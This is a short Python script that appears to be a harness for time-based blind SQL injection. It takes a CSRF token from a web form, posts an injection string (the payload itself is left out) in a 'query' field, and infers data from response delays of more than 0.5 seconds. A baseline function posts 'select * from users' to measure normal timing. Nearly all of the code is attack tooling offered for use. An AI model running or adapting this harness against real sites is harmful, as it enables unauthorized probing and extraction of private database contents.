import requests
from sys import argv

def inject(query, expected_time, url):
    """Sends the injection to the form and compares the response time to the expected response time.
    Use to determine if data exists"""
    injection = query # not included :)
    client = requests.session()
    response = client.get(url) # gets the csrf token
    try:
        csrf = client.cookies['csrftoken']
    except KeyError:
        raise RuntimeError("Csrf token not found on page", url, "Gave status code:", response.status_code)  
    # will work on a form with fields called csrfmiddlewaretoken and query
    payload = {"csrfmiddlewaretoken" : csrf, "query" : injection}
    r = client.post(url, data=payload, headers=dict(Referer=url))
    if r.status_code == 200:
        response_time = r.elapsed.total_seconds()
    else:
        raise RuntimeError("Post request failed with status", r.status_code)
    print("Site responded in", response_time, "seconds")
    if (response_time -expected_time) > 0.5: # found 0.5 interval was good enough in every test case
        return True
    else:
        return False

def get_base_response_time(url):
    time = requests.post(url, data="select * from users").elapsed.total_seconds() # returns a csrf error. This is still good enough to get an accurate base response time
    print("Base site response time set to:", time)
    return time